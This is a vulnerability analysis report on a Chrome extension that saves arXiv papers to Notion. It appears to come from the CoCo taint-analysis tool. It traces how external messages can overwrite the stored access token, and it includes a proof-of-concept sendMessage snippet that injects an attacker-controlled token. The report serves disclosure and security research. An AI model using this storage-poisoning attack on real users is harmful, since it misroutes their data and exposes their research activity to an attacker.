# CoCo Analysis: bgkglfpmfopkikgchgdmkppjebbhincc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgkglfpmfopkikgchgdmkppjebbhincc/opgen_generated_files/bg.js
(['8562'], 'bg_chrome_runtime_MessageExternal')
from bg_chrome_runtime_MessageExternal to chrome_storage_sync_set_sink
(No specific line numbers provided by CoCo)
```

**Code:**

```javascript
// Background script - External message handler (background.js line 965)
chrome.runtime.onMessageExternal.addListener((data, sender, sendResponse) => {
    chrome.storage.sync.set(data, () => { // ← attacker-controlled data stored
		sendResponse("auth data set successfully")
	})
});

// Notion API class - Retrieves stored token (notion.js line 12)
async getAuthTokenFromStorage() {
    return new Promise((resolve, reject) => {
        chrome.storage.sync.get("access_token", (token) => { // ← Retrieves poisoned token
            if (Object.keys(token).length === 0) reject("no auth token found in storage");
            else {
                resolve(token["access_token"]); // ← Returns attacker's token
            }
        });
    });
}

// Notion API class - Uses poisoned token in API calls (notion.js line 23)
async getDatabases(token) {
    const response = await fetch("https://arxivtonotion.herokuapp.com/v1/search/", {
        method: "POST",
        headers: new Headers({
            Authorization: `Bearer ${token}`, // ← attacker-controlled token used in Authorization header
            "Notion-Version": "2021-05-13",
        }),
        body: {
            query: "",
            sort: {
                direction: "ascending",
                timestamp: "last_edited_time",
            },
        },
    }).catch((err) => console.log(err));

    const searchResultData = await response.json();
    let databases = searchResultData["results"].filter((x) => x["object"] === "database");

    return databases;
}

// Notion API class - Uses poisoned token to write data (notion.js line 154)
async writePaperMetadataToDatabase(databaseProperties, metadata, token) {
    let requestBody = {
        parent: {
            database_id: databaseProperties["id"],
        },
        properties: {},
        children: [],
    };

    // ... build requestBody ...

    await fetch("https://arxivtonotion.herokuapp.com/v1/pages", {
        method: "POST",
        headers: new Headers({
            Authorization: `Bearer ${token}`, // ← attacker-controlled token used in Authorization header
            "Notion-Version": "2021-05-13",
            "Content-Type": "application/json",
        }),
        body: JSON.stringify(requestBody),
    }).catch((err) => console.log(err));
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - whitelisted domain can send external messages

**Attack:**

```javascript
// From whitelisted domain: https://arxivtonotion.github.io/*
// Attacker injects malicious access_token
chrome.runtime.sendMessage(
  "bgkglfpmfopkikgchgdmkppjebbhincc", // extension ID
  {
    access_token: "attacker-controlled-token-xyz123"
  },
  function(response) {
    console.log(response); // "auth data set successfully"
  }
);

// When user uses the extension, it will:
// 1. Retrieve the attacker's token from storage
// 2. Make API calls to arxivtonotion.herokuapp.com with attacker's token in Authorization header
// 3. This allows attacker to:
//    - Track which databases the user queries
//    - Associate user's arXiv reading activity with attacker's account
//    - Potentially exfiltrate user's research interests and paper metadata
```

**Impact:** Complete storage exploitation chain with privileged cross-origin request vulnerability. Attacker from whitelisted domain (https://arxivtonotion.github.io/*) can poison chrome.storage.sync with an arbitrary access_token. When the user subsequently uses the extension to save arXiv papers to Notion, the extension retrieves the poisoned token and includes it in Authorization headers for API requests to https://arxivtonotion.herokuapp.com. This allows the attacker to:

1. **Account Hijacking:** Associate the user's extension activity with the attacker's Notion account, causing the user's arXiv paper metadata to be sent to the attacker's backend.
2. **Privacy Violation:** Track which research papers the user is reading and saving, revealing sensitive information about their research interests and work.
3. **Data Exfiltration:** All paper metadata (titles, authors, abstracts, links, categories, dates) processed by the extension flows to the attacker's account via the poisoned authorization token.

The manifest.json whitelist includes https://arxivtonotion.github.io/* which could be exploited if the attacker can inject code on that domain. Even if only this ONE whitelisted domain is exploitable, this qualifies as TRUE POSITIVE per the methodology.
